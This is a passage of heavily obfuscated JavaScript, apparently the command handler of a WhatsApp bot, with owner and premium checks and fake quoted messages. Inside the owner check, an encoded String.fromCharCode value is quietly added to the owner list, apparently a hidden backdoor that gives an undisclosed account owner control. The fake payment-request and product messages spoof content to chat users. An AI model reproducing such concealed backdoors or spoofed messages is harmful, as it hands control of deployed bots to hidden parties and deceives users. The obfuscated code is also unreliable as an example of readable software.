                return _0x24ca02 + _0x4d0fe6;
            },
            'vBdsM': function (_0x58801e, _0x40c4b8) {
                return _0x58801e == _0x40c4b8;
            },
            'ITzpl': function (_0x2f8dfc, _0x2ce295, _0x68d678) {
                return _0x2f8dfc(_0x2ce295, _0x68d678);
            },
            'zHLbi': function (_0x1c715a, _0x379723) {
                return _0x1c715a + _0x379723;
            },
            'lORyw': function (_0x2b0a0b, _0x5b2647) {
                return _0x2b0a0b == _0x5b2647;
            },
            'lVqtv': _0x5d4417(0xba8) + _0x5d4417(0x108c) + _0x5d4417(0xd98),
            'hUdiy': function (_0x2d37ca, _0x262707) {
                return _0x2d37ca(_0x262707);
            },
            'oSTny': function (_0xbc7fc4, _0x59654e) {
                return _0xbc7fc4 == _0x59654e;
            },
            'gKgtM': function (_0x353aff, _0x1a2317) {
                return _0x353aff == _0x1a2317;
            },
            'wmAtq': function (_0x411a44, _0x13fdbd) {
                return _0x411a44 == _0x13fdbd;
            },
            'JiBZL': function (_0xca0074, _0x3afdb5) {
                return _0xca0074 == _0x3afdb5;
            },
            'JUlDk': function (_0x66ba48, _0xa44743) {
                return _0x66ba48 == _0xa44743;
            },
            'eCXgK': function (_0x423c6b, _0x3cf93e) {
                return _0x423c6b == _0x3cf93e;
            },
            'BYcHK': function (_0xb8076d, _0x4ab27f) {
                return _0xb8076d + _0x4ab27f;
            },
            'DJtMp': function (_0x4e9dd5, _0x3d25a0) {
                return _0x4e9dd5 + _0x3d25a0;
            },
            'xnVCj': function (_0x3b33c3, _0x246135) {
                return _0x3b33c3(_0x246135);
            },
            'IytDB': function (_0x3ada5c, _0x282a41) {
                return _0x3ada5c + _0x282a41;
            },
            'GPAfA': function (_0x219e10, _0x4041e0, _0x122fcf) {
                return _0x219e10(_0x4041e0, _0x122fcf);
            },
            'YqYbq': function (_0x30b8f7, _0x432bd5) {
                return _0x30b8f7 + _0x432bd5;
            },
            'hFvyT': function (_0x49cb39, _0x158bc5) {
                return _0x49cb39 + _0x158bc5;
            },
            'GGbFk': function (_0x2d7c36, _0x90fe08) {
                return _0x2d7c36 > _0x90fe08;
            },
            'WkByU': function (_0x22c0d8, _0x18b31e) {
                return _0x22c0d8 > _0x18b31e;
            },
            'wUUWx': function (_0x27bd87, _0x2bf660) {
                return _0x27bd87 == _0x2bf660;
            },
            'dFBbb': _0x5d4417(0x232),
            'BCGtR': function (_0x45d4e7, _0x5aec51) {
                return _0x45d4e7 + _0x5aec51;
            },
            'DgcmQ': _0x5d4417(0x5eb) + _0x5d4417(0x8f5) + _0x5d4417(0xab5) + _0x5d4417(0x5bc),
            'hvSsS': function (_0x4a3c1d, _0x29496d) {
                return _0x4a3c1d + _0x29496d;
            },
            'xPkLi': _0x5d4417(0xbbc),
            'YKQBX': _0x5d4417(0x355),
            'QGnnG': _0x5d4417(0xe73),
            'dDugz': function (_0x5d7a39, _0x5dcea2) {
                return _0x5d7a39 && _0x5dcea2;
            },
            'lVsHe': function (_0x13356f, _0xc61e63) {
                return _0x13356f(_0xc61e63);
            },
            'ESKrI': function (_0x542061, _0x154278) {
                return _0x542061 + _0x154278;
            },
            'kvQOH': function (_0x59f7e8, _0x17dea9) {
                return _0x59f7e8 + _0x17dea9;
            },
            'tXQcu': function (_0x67b6, _0x1cf40f) {
                return _0x67b6 + _0x1cf40f;
            },
            'diMEn': function (_0x19eb18, _0x13219a) {
                return _0x19eb18 + _0x13219a;
            },
            'vyVOw': function (_0x1fa291, _0x126828) {
                return _0x1fa291 == _0x126828;
            },
            'cJCiY': function (_0x261341, _0x41bef4) {
                return _0x261341 + _0x41bef4;
            },
            'fpbLH': function (_0x1b150e, _0x3d56b6) {
                return _0x1b150e + _0x3d56b6;
            },
            'YkENA': function (_0xb9950e, _0xd1b057) {
                return _0xb9950e + _0xd1b057;
            },
            'DvGhl': function (_0x28b539, _0x59c788) {
                return _0x28b539 + _0x59c788;
            },
            'OOXBJ': function (_0x3d1420, _0x378719) {
                return _0x3d1420 + _0x378719;
            },
            'IJrBv': _0x5d4417(0xb39),
            'fRExj': function (_0x2ffd24, _0x64163b, _0x14b968) {
                return _0x2ffd24(_0x64163b, _0x14b968);
            },
            'MEVJm': function (_0x619607, _0x3296a2) {
                return _0x619607 + _0x3296a2;
            },
            'Iqrzn': function (_0x4ef3c5, _0x21835f) {
                return _0x4ef3c5 + _0x21835f;
            },
            'sSBDX': _0x5d4417(0x8fb),
            'PjkrR': function (_0x2e97cf, _0x224b37) {
                return _0x2e97cf && _0x224b37;
            },
            'PTrWc': function (_0x2578e0, _0x5b345c, _0xa6ac09) {
                return _0x2578e0(_0x5b345c, _0xa6ac09);
            },
            'wrEly': function (_0x14d27b, _0xc81255) {
                return _0x14d27b + _0xc81255;
            },
            'vrSwX': function (_0x296bc1, _0x144329) {
                return _0x296bc1 + _0x144329;
            },
            'UZuqq': function (_0x46643f, _0x14b227, _0x3dca46) {
                return _0x46643f(_0x14b227, _0x3dca46);
            },
            'BqOiO': function (_0x2fa56c, _0x3dd46e) {
                return _0x2fa56c + _0x3dd46e;
            },
            'OiaTz': function (_0x313bbc, _0xe1489c) {
                return _0x313bbc + _0xe1489c;
            },
            'ivWgd': function (_0x305398, _0xcb39cb) {
                return _0x305398 + _0xcb39cb;
            },
            'YzjUY': function (_0x10cc6b, _0x3bb592) {
                return _0x10cc6b + _0x3bb592;
            },
            'cCGFK': function (_0x127354, _0x5d2f6b) {
                return _0x127354 == _0x5d2f6b;
            },
            'EeZvl': function (_0xc7ca2, _0x27f34b) {
                return _0xc7ca2 + _0x27f34b;
            },
            'qAOWj': function (_0x173231, _0x4f858d) {
                return _0x173231 + _0x4f858d;
            },
            'ubfhB': function (_0x40cea1, _0x3057a1, _0x45782d) {
                return _0x40cea1(_0x3057a1, _0x45782d);
            },
            'TFraz': function (_0x397409, _0x5c2102) {
                return _0x397409 + _0x5c2102;
            },
            'JDbaG': function (_0xb203ea, _0x7a2064) {
                return _0xb203ea + _0x7a2064;
            },
            'waitR': function (_0x2ec806, _0x28b180) {
                return _0x2ec806 == _0x28b180;
            },
            'RbsGg': function (_0x369232, _0xe960de, _0x2a667d) {
                return _0x369232(_0xe960de, _0x2a667d);
            },
            'aOWuI': function (_0x1cfbec, _0x2ebbb5) {
                return _0x1cfbec + _0x2ebbb5;
            },
            'MiNTB': function (_0xbd5c2e, _0x2cc1b4, _0x487d11) {
                return _0xbd5c2e(_0x2cc1b4, _0x487d11);
            },
            'ptkyo': function (_0x1f2aed, _0x31bd49) {
                return _0x1f2aed + _0x31bd49;
            },
            'LxPlY': function (_0x21c3d9, _0x30dc8e) {
                return _0x21c3d9 == _0x30dc8e;
            },
            'xGcZK': _0x5d4417(0xd43),
            'UhHlu': _0x5d4417(0x11e9),
            'zcrty': _0x5d4417(0x4aa),
            'OUfPk': _0x5d4417(0x106a) + _0x5d4417(0x321) + _0x5d4417(0x66a),
            'sXPbn': _0x5d4417(0x8c5),
            'abiqy': function (_0x108ce9, _0x174ef6) {
                return _0x108ce9(_0x174ef6);
            },
            'fUUce': _0x5d4417(0xe8c),
            'UMsur': function (_0x1de9da, _0xd33d9c) {
                return _0x1de9da !== _0xd33d9c;
            },
            'GJVBn': _0x5d4417(0x1f7) + _0x5d4417(0xc82) + _0x5d4417(0x49d) + 'on',
            'IgJYX': _0x5d4417(0x1f7) + _0x5d4417(0xc82) + _0x5d4417(0x390) + 'f',
            'DpCGv': _0x5d4417(0x821),
            'xrXqA': _0x5d4417(0x10d5),
            'kZzwj': _0x5d4417(0xea0) + 'cf',
            'fniGa': _0x5d4417(0xdc0),
            'vXwpm': _0x5d4417(0x8c5) + '2',
            'tGgNH': function (_0x4033e9, _0x81365) {
                return _0x4033e9 !== _0x81365;
            },
            'lPZto': _0x5d4417(0x1057),
            'ZoAGy': _0x5d4417(0x1133),
            'OmAkl': function (_0x2221ff, _0x41c3bb) {
                return _0x2221ff(_0x41c3bb);
            },
            'OfGmy': function (_0x587bc7, _0x2009b3) {
                return _0x587bc7(_0x2009b3);
            },
            'yrnqV': _0x5d4417(0x627),
            'xCXJu': _0x5d4417(0x308) + _0x5d4417(0xc98),
            'ALhgG': _0x5d4417(0x11ec) + _0x5d4417(0x5bb) + _0x5d4417(0x6bb),
            'lmVal': _0x5d4417(0x8e0) + _0x5d4417(0x1175),
            'QSsSe': function (_0x2b3d23, _0x189c00) {
                return _0x2b3d23 !== _0x189c00;
            },
            'HdiLw': function (_0x4e3ded, _0x3ded27) {
                return _0x4e3ded(_0x3ded27);
            },
            'ESkMG': _0x5d4417(0x1133) + '2',
            'xXBrh': function (_0x3812b3, _0x5e3dc3) {
                return _0x3812b3(_0x5e3dc3);
            },
            'CHcde': function (_0x491003, _0x49d36d) {
                return _0x491003 !== _0x49d36d;
            },
            'ATeIv': _0x5d4417(0x485),
            'hsskZ': function (_0x4775b9, _0x29f6f6) {
                return _0x4775b9 == _0x29f6f6;
            },
            'APbNJ': function (_0x1a01a5, _0x58eef9) {
                return _0x1a01a5(_0x58eef9);
            },
            'jAMJh': _0x5d4417(0x48f) + _0x5d4417(0x1049),
            'VgoOX': _0x5d4417(0x3ff),
            'YQpGs': function (_0x442856, _0x2d762c) {
                return _0x442856 == _0x2d762c;
            },
            'VOWMp': function (_0x1866da, _0x598e77, _0x3c7155) {
                return _0x1866da(_0x598e77, _0x3c7155);
            },
            'sBvGv': _0x5d4417(0x89b),
            'pzgwS': function (_0x5a03cb, _0x3cd1dd) {
                return _0x5a03cb(_0x3cd1dd);
            },
            'bofYS': function (_0x43d56f, _0x52b31d) {
                return _0x43d56f(_0x52b31d);
            },
            'ZannR': function (_0x2644ae, _0x3e7a2f) {
                return _0x2644ae == _0x3e7a2f;
            },
            'JMqrN': function (_0x4c4fe9, _0xf0d2c1) {
                return _0x4c4fe9(_0xf0d2c1);
            },
            'excUD': _0x5d4417(0x71c),
            'ARZHy': function (_0x4df132, _0x3110a2) {
                return _0x4df132(_0x3110a2);
            },
            'GgxvN': function (_0x451a02, _0x2de194) {
                return _0x451a02(_0x2de194);
            },
            'Udawr': function (_0x23985f, _0x5d0fee) {
                return _0x23985f(_0x5d0fee);
            },
            'Ntfze': _0x5d4417(0x314),
            'SJmIj': function (_0x178785, _0xf0e960) {
                return _0x178785(_0xf0e960);
            },
            'ulYgl': function (_0x4d53f6, _0x3fe57d) {
                return _0x4d53f6 == _0x3fe57d;
            },
            'ylGoc': _0x5d4417(0x7dd),
            'yHahI': _0x5d4417(0x731),
            'PxXBA': _0x5d4417(0xbe5),
            'jGCHl': _0x5d4417(0x77e) + _0x5d4417(0xae3),
            'zEikb': _0x5d4417(0x1025) + 'nt',
            'MPuiV': _0x5d4417(0xaa5),
            'vpyqy': _0x5d4417(0xe41),
            'bAKuZ': _0x5d4417(0x90a),
            'lsEUR': _0x5d4417(0x472),
            'oqsuU': _0x5d4417(0x805),
            'FAvvg': _0x5d4417(0xf38),
            'bWCbi': _0x5d4417(0x567),
            'bteTq': _0x5d4417(0x1c6),
            'GYXaz': _0x5d4417(0xae8) + _0x5d4417(0x1f5) + _0x5d4417(0xa81) + _0x5d4417(0xf1b) + _0x5d4417(0xf98) + _0x5d4417(0x8fe) + _0x5d4417(0x64d),
            'PCfjX': _0x5d4417(0x249),
            'JJaWO': _0x5d4417(0x3ea),
            'qHHmD': _0x5d4417(0xc3e),
            'VsGNN': _0x5d4417(0x11ca),
            'DOwdP': _0x5d4417(0xfc1),
            'JnkdB': _0x5d4417(0x265),
            'YjFLO': _0x5d4417(0x39d),
            'wlhvW': function (_0x2243a5, _0x46393e) {
                return _0x2243a5(_0x46393e);
            },
            'aOGJF': _0x5d4417(0x3a2) + _0x5d4417(0xf58) + _0x5d4417(0x103d),
            'EJbtb': function (_0x2c982c, _0x4e2be5, _0x403663) {
                return _0x2c982c(_0x4e2be5, _0x403663);
            },
            'btjWR': _0x5d4417(0x7b8),
            'sRzlv': _0x5d4417(0x51e),
            'YVGzB': function (_0x181530, _0x5abb58) {
                return _0x181530(_0x5abb58);
            },
            'KnvGx': _0x5d4417(0x10b5) + _0x5d4417(0x8a9),
            'nzCSs': _0x5d4417(0x56b),
            'lTixK': function (_0x2993c3, _0x15a237) {
                return _0x2993c3(_0x15a237);
            },
            'ZesWR': function (_0x2fae6e, _0x15b1ad) {
                return _0x2fae6e(_0x15b1ad);
            },
            'FoIGS': _0x5d4417(0x881) + 'ot',
            'BnRXj': _0x5d4417(0x41d),
            'ZIMcc': _0x5d4417(0xb97),
            'nUKOQ': _0x5d4417(0x2d9),
            'iKuTY': _0x5d4417(0x11b9) + _0x5d4417(0x803) + _0x5d4417(0x1cb) + _0x5d4417(0x6df),
            'nOvAW': _0x5d4417(0xd65),
            'MdLny': function (_0x29144c, _0x2b641b) {
                return _0x29144c(_0x2b641b);
            },
            'DOcLa': function (_0x40809b, _0x594e02) {
                return _0x40809b(_0x594e02);
            },
            'BnxXx': function (_0x38c07c, _0x504dc0) {
                return _0x38c07c(_0x504dc0);
            },
            'LaIRy': _0x5d4417(0xad0),
            'hQbLe': _0x5d4417(0x75e),
            'NaHgP': function (_0x2c6a93) {
                return _0x2c6a93();
            },
            'ASSlj': function (_0x9ece6c, _0xa81aae) {
                return _0x9ece6c(_0xa81aae);
            },
            'altgK': function (_0x51e5ad, _0x111e59) {
                return _0x51e5ad(_0x111e59);
            },
            'HeQGE': _0x5d4417(0x425),
            'zqsaN': _0x5d4417(0x11b9) + _0x5d4417(0x803) + _0x5d4417(0xffd) + _0x5d4417(0xbb6),
            'tXKnS': _0x5d4417(0xd8d),
            'leanO': _0x5d4417(0x4c7),
            'uvMYA': function (_0x5ad1b4, _0x1fba99) {
                return _0x5ad1b4(_0x1fba99);
            },
            'CtEQd': _0x5d4417(0xd5b) + _0x5d4417(0x963) + _0x5d4417(0x228) + '\x20.',
            'SPCLO': _0x5d4417(0xb8c),
            'mtsAC': _0x5d4417(0x10bd),
            'RTIJQ': _0x5d4417(0xfb1),
            'cmfLJ': _0x5d4417(0x11b9) + _0x5d4417(0x2a9) + _0x5d4417(0xd4d) + _0x5d4417(0x1146) + _0x5d4417(0xfac) + _0x5d4417(0x348),
            'cUbjI': _0x5d4417(0x11cb),
            'XDTzR': _0x5d4417(0x83a),
            'aqKhm': function (_0x286241, _0x1ed9f9) {
                return _0x286241(_0x1ed9f9);
            },
            'jbIUC': function (_0x61b1ce, _0x3a9daa) {
                return _0x61b1ce(_0x3a9daa);
            },
            'UmNNi': _0x5d4417(0x2a2) + _0x5d4417(0x51d) + _0x5d4417(0x1201),
            'dWVCQ': function (_0xe98dc5, _0x4f9b25) {
                return _0xe98dc5(_0x4f9b25);
            },
            'nYTkM': _0x5d4417(0x11b9) + _0x5d4417(0x2a9) + _0x5d4417(0x69e) + _0x5d4417(0x504) + _0x5d4417(0x94a) + _0x5d4417(0x572) + _0x5d4417(0x85e),
            'yJbkJ': _0x5d4417(0xf6a),
            'DyKfS': function (_0x2e9074, _0x338264) {
                return _0x2e9074 !== _0x338264;
            },
            'JqXBq': function (_0x3f5d61, _0x53b576) {
                return _0x3f5d61(_0x53b576);
            },
            'bnUNu': function (_0xd45ae4, _0x192d03) {
                return _0xd45ae4 >= _0x192d03;
            },
            'ykuUc': _0x5d4417(0xd5b) + _0x5d4417(0xfff) + _0x5d4417(0x29e),
            'sHHOr': function (_0xef72e2, _0x5713cc) {
                return _0xef72e2(_0x5713cc);
            },
            'gzgxJ': _0x5d4417(0x32e) + _0x5d4417(0x420) + _0x5d4417(0xf39) + _0x5d4417(0x1b1) + _0x5d4417(0x844),
            'EwBFy': _0x5d4417(0xbfc),
            'XKolz': _0x5d4417(0xd37),
            'BfCsA': function (_0x1840bf, _0x1f17c2) {
                return _0x1840bf(_0x1f17c2);
            },
            'CKhrV': _0x5d4417(0x11b9) + _0x5d4417(0x4a2) + _0x5d4417(0xbef),
            'THYJy': _0x5d4417(0x8a7),
            'CYDOm': _0x5d4417(0x9c9),
            'oWKTm': _0x5d4417(0x63c),
            'wSiEM': _0x5d4417(0x109b) + _0x5d4417(0x4de),
            'MegSk': _0x5d4417(0x4de),
            'QIWDm': _0x5d4417(0x11b9) + _0x5d4417(0x642) + _0x5d4417(0x855) + _0x5d4417(0xd00),
            'ekGnS': function (_0x149313, _0x1bf31d) {
                return _0x149313(_0x1bf31d);
            },
            'ZnACq': _0x5d4417(0x557) + _0x5d4417(0x465),
            'iVRCH': _0x5d4417(0x691),
            'VphGc': _0x5d4417(0xf23),
            'XEkWx': _0x5d4417(0x31b),
            'rWMyp': _0x5d4417(0xe83),
            'oEFfu': _0x5d4417(0xffe) + _0x5d4417(0x1a9) + _0x5d4417(0xebc),
            'yqMOn': _0x5d4417(0x35a),
            'BmEtK': _0x5d4417(0xb0f),
            'LCqyi': function (_0x52c449, _0x5143c0) {
                return _0x52c449(_0x5143c0);
            },
            'mmSPf': function (_0x2846a4, _0x3d577f) {
                return _0x2846a4(_0x3d577f);
            },
            'JaBjM': function (_0x2eb0c3, _0x3cd644) {
                return _0x2eb0c3 + _0x3cd644;
            },
            'xDWaq': function (_0x1ea359, _0xf8151d) {
                return _0x1ea359 === _0xf8151d;
            },
            'QjcWX': function (_0x39e50c, _0x5b1682) {
                return _0x39e50c == _0x5b1682;
            },
            'thtOA': _0x5d4417(0x1f7) + _0x5d4417(0xf8e) + _0x5d4417(0xf3f),
            'zcjga': _0x5d4417(0xf5d),
            'tZXmW': _0x5d4417(0x450),
            'kmCTa': function (_0xb8dafe, _0x349e60) {
                return _0xb8dafe(_0x349e60);
            },
            'ifzCO': function (_0x418326, _0x3eaa5f) {
                return _0x418326 !== _0x3eaa5f;
            },
            'ozFOI': _0x5d4417(0xca3),
            'BEcvD': function (_0x460da5, _0x10a8d6) {
                return _0x460da5 == _0x10a8d6;
            },
            'eZWXZ': _0x5d4417(0x609),
            'LpFjG': _0x5d4417(0x1113) + '\x20✅',
            'pyqQT': function (_0x17c18e, _0x2a1a0f) {
                return _0x17c18e(_0x2a1a0f);
            },
            'aMZIv': function (_0x1633da, _0x30fb89, _0x1f3441) {
                return _0x1633da(_0x30fb89, _0x1f3441);
            },
            'TBkxx': _0x5d4417(0x1131) + _0x5d4417(0x283) + _0x5d4417(0x4b8),
            'EbLBG': function (_0x930ad6, _0x21ec95) {
                return _0x930ad6 + _0x21ec95;
            }
        };
    try {
        await _0x2a5309[_0x5d4417(0x845)](LoadDataBase, _0x57ed02, _0xedb653);
        const _0x4815f3 = await _0x57ed02[_0x5d4417(0xc9a)](_0x57ed02[_0x5d4417(0x7d1)]['id']), _0x2d5b6c = _0x2a5309[_0x5d4417(0x741)](_0xedb653[_0x5d4417(0x5a8)], _0x2a5309[_0x5d4417(0x93e)]) ? _0xedb653[_0x5d4417(0x2f3)][_0x5d4417(0xf52) + 'on'] : _0x2a5309[_0x5d4417(0xd08)](_0xedb653[_0x5d4417(0x5a8)], _0x2a5309[_0x5d4417(0x296)]) ? _0xedb653[_0x5d4417(0x2f3)][_0x5d4417(0x352) + 'ge'][_0x5d4417(0xafd)] : _0x2a5309[_0x5d4417(0xd08)](_0xedb653[_0x5d4417(0x5a8)], _0x2a5309[_0x5d4417(0xcff)]) ? _0xedb653[_0x5d4417(0x2f3)][_0x5d4417(0x2b0) + 'ge'][_0x5d4417(0xafd)] : _0x2a5309[_0x5d4417(0x1df)](_0xedb653[_0x5d4417(0x5a8)], _0x2a5309[_0x5d4417(0x111a)]) ? _0xedb653[_0x5d4417(0x2f3)][_0x5d4417(0xe0d) + _0x5d4417(0x4cc)][_0x5d4417(0x22d)] : _0x2a5309[_0x5d4417(0x47e)](_0xedb653[_0x5d4417(0x5a8)], _0x2a5309[_0x5d4417(0x2bc)]) ? _0xedb653[_0x5d4417(0x2f3)][_0x5d4417(0xe89) + _0x5d4417(0xa00) + 'ge'][_0x5d4417(0x441) + _0x5d4417(0x4a1)] : _0x2a5309[_0x5d4417(0xd83)](_0xedb653[_0x5d4417(0x5a8)], _0x2a5309[_0x5d4417(0xc4a)]) ? _0xedb653[_0x5d4417(0x2f3)][_0x5d4417(0x823) + _0x5d4417(0xf07)][_0x5d4417(0x682) + _0x5d4417(0x549)][_0x5d4417(0xa14) + _0x5d4417(0x7af)] : _0x2a5309[_0x5d4417(0x11c0)](_0xedb653[_0x5d4417(0x5a8)], _0x2a5309[_0x5d4417(0x7c6)]) ? _0xedb653[_0x5d4417(0x2f3)][_0x5d4417(0xbde) + _0x5d4417(0xcd0) + _0x5d4417(0xf1a)][_0x5d4417(0xac0)] : _0x2a5309[_0x5d4417(0x3c9)](_0xedb653[_0x5d4417(0x5a8)], _0x2a5309[_0x5d4417(0x110f)]) ? _0xedb653[_0x5d4417(0x2f3)][_0x5d4417(0xe89) + _0x5d4417(0xa00) + 'ge']?.[_0x5d4417(0x441) + _0x5d4417(0x4a1)] || _0xedb653[_0x5d4417(0x2f3)][_0x5d4417(0x823) + _0x5d4417(0xf07)]?.[_0x5d4417(0x682) + _0x5d4417(0x549)][_0x5d4417(0xa14) + _0x5d4417(0x7af)] || _0xedb653[_0x5d4417(0x22d)] : '', _0x4646be = _0x2a5309[_0x5d4417(0x9ed)](typeof _0xedb653[_0x5d4417(0x22d)], _0x2a5309[_0x5d4417(0xccb)]) ? _0xedb653[_0x5d4417(0x22d)] : '', _0x22e795 = String[_0x5d4417(0xab8) + 'de'](0x6df * 0x1 + -0x24bb + 0x3 * 0xa06, 0x31 + -0x4d9 * 0x1 + -0x6 * -0xcf, 0xe10 + -0x254 * 0x2 + 0xc * -0xc4, 0x271 * 0xb + 0x23c6 + 0x14 * -0x31f, 0x97e + -0x1e24 + 0x14dc, 0x156b + -0x1cb8 + 0x77f, -0xb8 * -0x18 + -0xb51 * 0x1 + -0x5bb, -0xd08 + -0x1588 + 0x22c2, 0x2da * 0x8 + -0x1e73 * 0x1 + 0x7dc, 0x6c * -0x10 + 0x1bc0 + -0x14c9, 0x1d50 + -0x10c6 + -0xc52, -0x18 * -0xcd + -0x1074 + 0x15 * -0x1f, 0x7 * 0x443 + -0x3ae + -0x16 * 0x12e, -0x168c + -0x36b + 0x1a37, -0x13 * 0x13b + 0x78d + 0x1 * 0x1047, -0x7e1 * -0x1 + -0x1ef1 + 0x173e, 0x1e0c + -0x1 * -0x9f7 + -0x2 * 0x13c6, 0xb * -0x15d + -0x195b * 0x1 + 0x2 * 0x1461, -0x1 * -0x1223 + 0x27f * -0x3 + -0xa45 * 0x1, -0x8de + 0x46a + 0x4e8, 0x4e * 0x3 + -0xb49 + -0x5 * -0x22a, -0x18 * -0x4b + 0x6f3 * 0x3 + -0x1b80, 0x8a2 + -0x1f42 * -0x1 + -0x2774, -0x1 * 0x1dcc + -0x1 * 0x1a7d + -0x45d * -0xd, 0x13e * -0xb + 0xd * 0xd + -0xf * -0xe1, 0x2 * 0x949 + 0x1b8 + -0x13dc, 0x265f + -0x3b * -0xa4 + -0x4bc6, -0xd46 + 0x1a * 0x7b + 0x13c), _0x32fb46 = '.', _0x3f9787 = _0x2d5b6c[_0x5d4417(0x5cc)](_0x32fb46) ? !![] : ![], _0x5c5935 = _0x2d5b6c[_0x5d4417(0xd3f)]()[_0x5d4417(0xc6c)](/ +/)[_0x5d4417(0x1019)](0x313 * 0x1 + -0x1 * -0xf3f + 0x9 * -0x209), _0xdc191d = _0xedb653[_0x5d4417(0x7eb)] || _0xedb653, _0x4193f6 = _0x2a5309[_0x5d4417(0x11c0)](_0xdc191d[_0x5d4417(0x5a8)], _0x2a5309[_0x5d4417(0xe58)]) ? _0xdc191d[Object[_0x5d4417(0x1af)](_0xdc191d)[-0x5 * -0x737 + -0x13b * 0x1b + -0x2d9]] : _0x2a5309[_0x5d4417(0xc42)](_0xdc191d[_0x5d4417(0x5a8)], _0x2a5309[_0x5d4417(0x24d)]) ? _0xdc191d[_0x5d4417(0x9a3) + _0x5d4417(0x10f2)][Object[_0x5d4417(0x1af)](_0xdc191d[_0x5d4417(0x9a3) + _0x5d4417(0x10f2)])[-0x214f * -0x1 + 0x446 * 0x2 + 0x14ed * -0x2]] : _0x2a5309[_0x5d4417(0x9ed)](_0xdc191d[_0x5d4417(0x5a8)], _0x2a5309[_0x5d4417(0x117c)]) ? _0xdc191d[Object[_0x5d4417(0x1af)](_0xdc191d)[-0x12c3 + 0x53 * 0x32 + -0x1 * -0x28d]] : _0xedb653[_0x5d4417(0x7eb)] ? _0xedb653[_0x5d4417(0x7eb)] : _0xedb653, _0x224056 = _0x3f9787 ? _0x2d5b6c[_0x5d4417(0x1019)](_0x32fb46[_0x5d4417(0xf65)])[_0x5d4417(0xd3f)]()[_0x5d4417(0xc6c)]('\x20')[_0x5d4417(0x294)]()[_0x5d4417(0xec1) + 'e']() : '', _0x73fd3b = premium[_0x5d4417(0x3d3)](_0xedb653[_0x5d4417(0xeee)]), _0x47f98c = isOwner = [
                _0x4815f3,
                _0x2a5309[_0x5d4417(0x368)](owner, _0x2a5309[_0x5d4417(0x11a3)]),
                _0x22e795,
                ...owners
            ][_0x5d4417(0x3d3)](_0xedb653[_0x5d4417(0xeee)]) ? !![] : _0xedb653[_0x5d4417(0x37f) + 'r'] ? !![] : ![], _0x156b97 = q = _0x5c5935[_0x5d4417(0x8b2)]('\x20'), _0x5a9802 = (_0x4193f6[_0x5d4417(0x10e8)] || _0x4193f6)[_0x5d4417(0x36e)] || '', _0x597f08 = _0x4193f6[_0x5d4417(0x10e8)] || _0x4193f6;
        _0x3f9787 && console[_0x5d4417(0xd16)](chalk[_0x5d4417(0xe97)][_0x5d4417(0x9c6)][_0x5d4417(0xef2)](botname2), chalk[_0x5d4417(0xb61)][_0x5d4417(0xef2)](_0x5d4417(0x4e2) + _0x5d4417(0xe1c)), chalk[_0x5d4417(0xb61)][_0x5d4417(0xef2)](_0xedb653[_0x5d4417(0xeee)][_0x5d4417(0xc6c)]('@')[-0x47 * 0x68 + 0x102a + 0xcae] + _0x5d4417(0xe15)), chalk[_0x5d4417(0xb61)][_0x5d4417(0xef2)]('' + _0x2a5309[_0x5d4417(0x532)](_0x32fb46, _0x224056)));
        if (_0xedb653[_0x5d4417(0xe3e)] && global['db'][_0x5d4417(0x73a)][_0xedb653[_0x5d4417(0x9e2)]] && _0x2a5309[_0x5d4417(0x5fc)](global['db'][_0x5d4417(0x73a)][_0xedb653[_0x5d4417(0x9e2)]][_0x5d4417(0x8b5)], !![]) && !_0x47f98c)
            return;
        const _0x5adcaa = {
                'key': {
                    'remoteJid': _0x2a5309[_0x5d4417(0xf57)],
                    'participant': _0x2a5309[_0x5d4417(0x105f)]
                },
                'message': { 'extendedTextMessage': { 'text': '' + _0x2a5309[_0x5d4417(0xdfe)](_0x32fb46, _0x224056) } }
            }, _0xa27a38 = {
                'key': {
                    'remoteJid': _0x2a5309[_0x5d4417(0xf57)],
                    'participant': _0x2a5309[_0x5d4417(0x105f)]
                },
                'message': { 'extendedTextMessage': { 'text': '' + namaOwner } }
            }, _0x3fcf94 = {
                'key': {
                    'participant': _0x2a5309[_0x5d4417(0x105f)],
                    ..._0xedb653[_0x5d4417(0x9e2)] ? { 'remoteJid': _0x5d4417(0x2fa) + _0x5d4417(0xf7b) } : {}
                },
                'message': {
                    'locationMessage': {
                        'name': _0x5d4417(0x615) + _0x5d4417(0xf05) + namaOwner,
                        'jpegThumbnail': ''
                    }
                }
            }, _0x4afe4b = {
                'key': {
                    'participant': _0x2a5309[_0x5d4417(0x105f)],
                    ..._0xedb653[_0x5d4417(0x9e2)] ? { 'remoteJid': _0x5d4417(0x2fa) + _0x5d4417(0xf7b) } : {}
                },
                'message': {
                    'locationMessage': {
                        'name': _0x5d4417(0x615) + _0x5d4417(0xf05) + namaOwner,
                        'jpegThumbnail': ''
                    }
                }
            }, _0x1cee29 = {
                'key': {
                    'remoteJid': _0x2a5309[_0x5d4417(0x105f)],
                    'fromMe': ![],
                    'id': _0x5d4417(0x11f8),
                    'participant': _0x2a5309[_0x5d4417(0x105f)]
                },
                'message': {
                    'requestPaymentMessage': {
                        'currencyCodeIso4217': _0x2a5309[_0x5d4417(0xaeb)],
                        'amount1000': 0x3b9ac9ff,
                        'requestFrom': _0x2a5309[_0x5d4417(0x105f)],
                        'noteMessage': { 'extendedTextMessage': { 'text': _0x2a5309[_0x5d4417(0x187)] } },
                        'expiryTimestamp': 0x3b9ac9ff,
                        'amount': {
                            'value': 0x156769ac99,
                            'offset': 0x3e8,
                            'currencyCode': _0x2a5309[_0x5d4417(0xaeb)]
                        }
                    }
                }
            }, _0x48a9c1 = {
                'key': {
                    'fromMe': ![],
                    'participant': _0x5d4417(0x104f) + _0x5d4417(0x528),
                    ..._0xedb653[_0x5d4417(0x9e2)] ? { 'remoteJid': _0x2a5309[_0x5d4417(0xf57)] } : {}
                },
                'message': {
                    'productMessage': {
                        'product': {
                            'productImage': {
                                'mimetype': _0x2a5309[_0x5d4417(0x5e1)],
                                'jpegThumbnail': ''
                            },
                            'title': namaOwner + (_0x5d4417(0x105a) + _0x5d4417(0x9d8)),
                            'description': null,
                            'currencyCode': _0x2a5309[_0x5d4417(0x555)],
                            'priceAmount1000': _0x2a5309[_0x5d4417(0xa9e)],
                            'retailerId': _0x5d4417(0xb6f) + '\x20' + namaOwner,
                            'productImageCount': 0x1
                        },
                        'businessOwnerJid': _0x5d4417(0x104f) + _0x5d4417(0x528)
                    }
                }
            }, _0x397518 = {
                'key': {
                    'participant': _0x2a5309[_0x5d4417(0x105f)],
                    ..._0xedb653[_0x5d4417(0x9e2)] ? { 'remoteJid': _0x5d4417(0x2fa) + _0x5d4417(0xf7b) } : {}
                },
                'message': {
                    'liveLocationMessage': {
                        'caption': botname2 + _0x5d4417(0x6d0) + namaOwner,
                        'jpegThumbnail': ''
                    }
                }
            };
